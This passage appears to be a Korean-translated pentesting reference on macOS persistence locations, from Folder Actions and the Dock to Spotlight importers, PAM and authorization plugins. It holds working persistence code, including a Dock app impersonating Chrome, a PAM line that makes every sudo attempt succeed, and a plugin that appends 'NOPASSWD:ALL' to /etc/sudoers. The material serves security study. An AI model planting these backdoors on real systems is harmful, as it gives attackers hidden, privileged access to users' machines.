```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
작업 큐를 `atq:`로 확인하세요.
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
위에서 두 개의 예약된 작업을 볼 수 있습니다. `at -c JOBNUMBER`를 사용하여 작업의 세부 정보를 출력할 수 있습니다.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> AT tasks가 활성화되어 있지 않으면 생성된 작업은 실행되지 않습니다.

해당 **job files**는 `/private/var/at/jobs/`에서 찾을 수 있습니다.
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
파일 이름에는 큐, 작업 번호, 예약 실행 시간이 포함되어 있습니다. 예를 들어 `a0001a019bdcd2`를 살펴보겠습니다.

- `a` - 큐입니다
- `0001a` - 16진수로 된 작업 번호, `0x1a = 26`
- `019bdcd2` - 시간(16진수). epoch 이후 경과한 분(minutes)을 나타냅니다. `0x019bdcd2`는 십진수로 `26991826`입니다. 이를 60으로 곱하면 `1619509560`이 되며, 이는 `GMT: 2021. April 27., Tuesday 7:46:00`입니다.

작업 파일을 출력해 보면 `at -c`로 얻은 것과 동일한 정보가 포함되어 있음을 알 수 있습니다.

### Folder Actions

작성: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
작성: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 Folder Actions를 구성하려면 인수를 포함해 `osascript`를 호출하여 **`System Events`**에 접근할 수 있어야 합니다
- TCC 우회: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop, Documents 및 Downloads와 같은 일부 기본 TCC 권한을 가집니다

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- 루트 권한 필요
- **Trigger**: 지정된 폴더에 대한 접근
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: 지정된 폴더에 대한 접근

#### 설명 및 악용

Folder Actions는 폴더에 항목을 추가/제거하거나 폴더 창을 열거나 크기를 변경하는 등 폴더의 변화에 의해 자동으로 트리거되는 스크립트입니다. 이러한 액션은 다양한 작업에 활용될 수 있으며 Finder UI나 terminal 명령 등 여러 방식으로 트리거할 수 있습니다.

Folder Actions를 설정하려면 다음과 같은 방법이 있습니다:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac)를 사용해 Folder Action 워크플로를 제작하고 서비스로 설치합니다.
2. 폴더의 컨텍스트 메뉴에 있는 Folder Actions Setup을 통해 스크립트를 수동으로 연결합니다.
3. OSAScript를 이용해 Apple Event 메시지를 `System Events.app`로 보내 Folder Action을 프로그래밍적으로 설정합니다.
- 이 방법은 액션을 시스템에 내장시켜 일정 수준의 지속성을 제공하는 데 특히 유용합니다.

다음 스크립트는 Folder Action으로 실행할 수 있는 예제입니다:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
위 스크립트를 Folder Actions에서 사용하려면 다음을 사용하여 컴파일하세요:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
스크립트가 컴파일된 후, 아래 스크립트를 실행하여 Folder Actions를 설정하세요. 이 스크립트는 Folder Actions를 전역적으로 활성화하고 이전에 컴파일된 스크립트를 Desktop 폴더에 연결합니다.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
설정 스크립트를 다음과 같이 실행하세요:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- GUI를 통해 이 persistence를 구현하는 방법은 다음과 같습니다:

다음은 실행될 스크립트입니다:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
다음 명령으로 컴파일: `osacompile -l JavaScript -o folder.scpt source.js`

다음 위치로 이동:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Then, open the `Folder Actions Setup` app, select the **감시할 폴더** and select in your case **`folder.scpt`** (in my case I called it output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

이제 해당 폴더를 **Finder**로 열면 스크립트가 실행됩니다.

This configuration was stored in the **plist** located in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in base64 format.

이제 GUI 접근 없이 이 persistence를 준비해보겠습니다:

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`을 복사**하여 `/tmp`에 백업합니다:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **설정한 Folder Actions 제거**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

이제 빈 환경이 되었으므로

3. 백업 파일을 복사합니다: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. 이 설정을 반영하려면 Folder Actions Setup.app을 엽니다: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> 그리고 이 방법은 저에게는 작동하지 않았습니다. 하지만 이것들은 writeup의 지침입니다:(

### Dock 바로가기

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- sandbox를 우회하는 데 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 시스템 내부에 악성 애플리케이션을 설치해야 합니다
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- `~/Library/Preferences/com.apple.dock.plist`
- **트리거**: 사용자가 Dock 내의 앱을 클릭할 때

#### 설명 및 악용

Dock에 표시되는 모든 애플리케이션은 plist에 지정되어 있습니다: **`~/Library/Preferences/com.apple.dock.plist`**

다음과 같이 **애플리케이션을 추가**할 수 있습니다:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
약간의 **social engineering**을 사용하면 dock 안에서 예를 들어 **impersonate for example Google Chrome** 하고 실제로 자신의 스크립트를 실행할 수 있습니다:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### 색상 선택기

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 매우 특정한 동작이 필요함
- 또 다른 sandbox에서 실행되게 됨
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- `/Library/ColorPickers`
- 루트 권한 필요
- 트리거: 색상 선택기 사용
- `~/Library/ColorPickers`
- 트리거: 색상 선택기 사용

#### 설명 및 익스플로잇

**Compile a color picker** 번들을 코드와 함께 컴파일하세요 (예로 [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) 그리고 constructor를 추가하세요 (예: [Screen Saver section](macos-auto-start-locations.md#screen-saver)) 그런 다음 번들을 `~/Library/ColorPickers`에 복사하세요.

그러면 색상 선택기가 트리거될 때 당신의 코드도 실행됩니다.

당신의 라이브러리를 로드하는 바이너리는 **매우 제한적인 sandbox**를 가집니다: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**작성**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**작성**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- 샌드박스 우회에 유용한가: **아니오, 자체 앱을 실행해야 하기 때문에**
- TCC bypass: ???

#### 위치

- 특정 앱

#### 설명 & Exploit

Finder Sync Extension를 포함한 애플리케이션 예제는 [**여기에서 확인할 수 있습니다**](https://github.com/D00MFist/InSync).

애플리케이션은 `Finder Sync Extensions`를 가질 수 있습니다. 이 확장 기능은 실행될 애플리케이션 내부에 포함됩니다. 또한 확장이 코드를 실행하려면 일부 유효한 Apple 개발자 인증서로 **서명되어야 하며**, **샌드박스화**되어야 합니다(완화된 예외를 추가할 수는 있지만) 그리고 다음과 같이 등록되어야 합니다:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

참고 글: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
참고 글: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 하지만 common application sandbox에 갇히게 됨
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- `/System/Library/Screen Savers`
- 루트 권한 필요
- **Trigger**: Select the screen saver
- `/Library/Screen Savers`
- 루트 권한 필요
- **Trigger**: Select the screen saver
- `~/Library/Screen Savers`
- **Trigger**: Select the screen saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 설명 & Exploit

Xcode에서 새 프로젝트를 생성하고 템플릿으로 새 **Screen Saver**를 만드세요. 그런 다음 여기에 코드를 추가합니다 — 예를 들어 로그를 생성하는 다음 코드를 사용할 수 있습니다.

**빌드**한 뒤 `.saver` 번들을 **`~/Library/Screen Savers`**에 복사하세요. 그런 다음 Screen Saver GUI를 열고 클릭하면 많은 로그가 생성됩니다:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> 이 코드를 로드하는 바이너리의 entitlements(`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) 내부에서 **`com.apple.security.app-sandbox`**를 찾을 수 있으므로 당신은 **inside the common application sandbox**에 있게 됩니다.

Saver 코드:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- But you will end in an application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- The sandbox looks very limited

#### Location

- `~/Library/Spotlight/`
- **Trigger**: A new file with a extension managed by the spotlight plugin is created.
- `/Library/Spotlight/`
- **Trigger**: A new file with a extension managed by the spotlight plugin is created.
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: A new file with a extension managed by the spotlight plugin is created.
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: A new file with a extension managed by the spotlight plugin is created.
- New app required

#### Description & Exploitation

Spotlight는 macOS에 내장된 검색 기능으로, 사용자가 컴퓨터의 데이터에 대해 **빠르고 포괄적으로 접근**할 수 있도록 설계되었습니다.\
이러한 빠른 검색 기능을 위해 Spotlight는 **독점 데이터베이스**를 유지하고, 대부분의 파일을 **파싱하여 인덱스를 생성**함으로써 파일 이름과 내용 모두에서 빠른 검색을 가능하게 합니다.

Spotlight의 기반 메커니즘은 중앙 프로세스인 'mds'를 포함하며, 이는 **'metadata server.'**의 약자입니다. 이 프로세스가 전체 Spotlight 서비스를 조정합니다. 보완적으로, 서로 다른 파일 유형을 인덱싱하는 등 다양한 유지관리 작업을 수행하는 여러 'mdworker' 데몬이 존재합니다 (`ps -ef | grep mdworker`). 이러한 작업은 Spotlight importer plugins, 또는 **".mdimporter bundles**"를 통해 가능하며, 이를 통해 Spotlight는 다양한 파일 형식의 콘텐츠를 이해하고 인덱싱할 수 있습니다.

플러그인 또는 **`.mdimporter`** 번들은 앞서 언급한 위치에 놓이며, 새 번들이 나타나면 몇 분 내에 로드됩니다(서비스 재시작 불필요). 이 번들은 **어떤 파일 형식과 확장자를 처리할 수 있는지**를 명시해야 하며, 이렇게 하면 Spotlight는 지정된 확장자를 가진 새 파일이 생성될 때 해당 번들을 사용합니다.

It's possible to **find all the `mdimporters`** loaded running:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
예를 들어 **/Library/Spotlight/iBooksAuthor.mdimporter**는 이러한 유형의 파일(확장자 `.iba` 및 `.book` 등)을 파싱하는 데 사용됩니다:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> 다른 `mdimporter`의 Plist를 확인하면 **`UTTypeConformsTo`** 항목을 찾지 못할 수 있습니다. 이는 해당 항목이 내장된 _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) 이기 때문에 확장자를 명시할 필요가 없기 때문입니다.
>
> 또한 System default plugins는 항상 우선권을 가지므로 공격자는 Apple의 자체 `mdimporters`에 의해 인덱싱되지 않은 파일에만 접근할 수 있습니다.

To create your own importer you could start with this project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) and then change the name, the **`CFBundleDocumentTypes`** and add **`UTImportedTypeDeclarations`** so it supports the extension you would like to support and refelc them in **`schema.xml`**.\
Then **change** the code of the function **`GetMetadataForFile`** to execute your payload when a file with the processed extension is created.

Finally **build and copy your new `.mdimporter`** to one of thre previous locations and you can chech whenever it's loaded **monitoring the logs** or checking **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> 더 이상 작동하지 않는 것으로 보입니다.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 특정 사용자 작업이 필요함
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

더 이상 작동하지 않는 것으로 보입니다.

## Root Sandbox Bypass

> [!TIP]
> 여기서는 **sandbox bypass**에 유용한 시작 위치들을 찾을 수 있습니다. 이는 **root** 권한으로 **파일에 쓰기**만 해도 무언가를 실행하게 하거나 기타 **특이한 조건들**을 요구합니다.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 하지만 root 권한이 필요함
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- 루트 권한 필요
- **Trigger**: 지정된 시간에 실행
- `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
- 루트 권한 필요
- **Trigger**: 지정된 시간에 실행

#### Description & Exploitation

주기적 스크립트 (**`/etc/periodic`**)는 `/System/Library/LaunchDaemons/com.apple.periodic*`에 구성된 **launch daemons** 때문에 실행됩니다. `/etc/periodic/`에 저장된 스크립트는 파일의 소유자 권한으로 **실행**되므로 잠재적인 권한 상승에는 작동하지 않습니다.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
실행될 다른 주기적 스크립트는 **`/etc/defaults/periodic.conf`**에 명시되어 있습니다:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
만약 `/etc/daily.local`, `/etc/weekly.local` 또는 `/etc/monthly.local` 중 어느 파일에든 쓸 수 있다면, 해당 파일은 **언젠가 실행됩니다**.

> [!WARNING]
> 주기적 스크립트는 **스크립트 소유자 권한으로 실행됩니다**. 따라서 일반 사용자가 스크립트의 소유자라면 그 사용자 권한으로 실행됩니다(이로 인해 권한 상승 공격이 방지될 수 있습니다).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- 샌드박스 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 단, root가 필요합니다
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- 항상 root 필요

#### 설명 & Exploitation

PAM은 macOS 내에서 쉬운 실행보다는 **persistence**와 멀웨어에 더 초점을 맞추므로, 이 문서에서는 자세한 설명을 제공하지 않습니다. **이 기술을 더 잘 이해하려면 writeups를 읽으세요**.

PAM 모듈 확인:
```bash
ls -l /etc/pam.d
```
PAM을 악용한 persistence/privilege escalation technique는 모듈 /etc/pam.d/sudo를 수정하여 맨 앞에 다음 라인을 추가하는 것만큼 간단합니다:
```bash
auth       sufficient     pam_permit.so
```
그러면 **다음과 같이 보일** 것입니다:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
따라서 **`sudo`를 사용하려는 모든 시도는 성공합니다**.

> [!CAUTION]
> 이 디렉터리는 TCC로 보호되어 있으므로 사용자가 접근 권한을 요청하는 프롬프트를 받게 될 가능성이 매우 높습니다.

또 다른 좋은 예로는 su가 있으며, PAM modules에 파라미터를 전달할 수 있다는 것을 볼 수 있습니다(그리고 이 파일을 backdoor할 수도 있습니다):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

참고: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\  
참고: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- 하지만 root 권한이 필요하고 추가 구성이 필요함
- TCC 우회: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
- root 권한 필요
- authorization database를 구성하여 플러그인을 사용하도록 설정해야 함

#### Description & Exploitation

사용자가 로그인할 때 실행되어 persistence를 유지하는 authorization plugin을 생성할 수 있다. 이러한 플러그인 생성 방법에 대한 자세한 내용은 위의 writeup들을 참고하라(주의: 잘못 작성된 플러그인은 시스템에서 잠길 수 있으며 recovery mode에서 mac을 정리해야 할 수도 있음).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Move** 번들을 로드될 위치로 이동:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
마지막으로 이 플러그인을 로드할 **규칙**을 추가하세요:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`**는 권한 부여 프레임워크에 **권한 부여를 위해 외부 메커니즘을 호출해야 함**을 알립니다. 또한, **`privileged`**는 이를 root로 실행되게 합니다.

다음과 같이 트리거하세요:
```bash
security authorize com.asdf.asdf
```
그리고 **staff 그룹은 sudo 접근 권한을 가져야 함** (확인하려면 `/etc/sudoers` 읽기).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- sandbox를 bypass하는 데 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 하지만 root 권한이어야 하고 사용자가 man을 사용해야 함
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- root 권한 필요
- **`/private/etc/man.conf`**: man이 사용될 때마다

#### Description & Exploit

설정 파일 **`/private/etc/man.conf`**는 man 문서 파일을 열 때 사용할 binary/script를 지정합니다. 따라서 실행 파일의 경로를 수정하면 사용자가 문서를 보기 위해 man을 사용할 때마다 backdoor가 실행될 수 있습니다.

예: **`/private/etc/man.conf`**에 다음을 설정:
```
MANPAGER /tmp/view
```
그런 다음 `/tmp/view`를 다음과 같이 생성합니다:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**해설**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- bypass sandbox에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 하지만 root 권한이 필요하고 apache가 실행 중이어야 함
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd에는 entitlements가 없음

#### 위치

- **`/etc/apache2/httpd.conf`**
- Root 권한 필요
- 트리거: Apache2가 시작될 때

#### 설명 & Exploit

다음과 같은 줄을 추가하여 `/etc/apache2/httpd.conf`에서 모듈을 로드하도록 지정할 수 있다:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
이렇게 하면 컴파일된 모듈이 Apache에 의해 로드됩니다. 단, 다음 중 하나를 수행해야 합니다: **유효한 Apple 인증서로 서명**, 또는 시스템에 **새로운 신뢰할 수 있는 인증서를 추가**한 뒤 해당 인증서로 **서명**해야 합니다.

필요한 경우 서버가 시작되도록 하기 위해 다음을 실행할 수 있습니다:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb에 대한 코드 예시:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
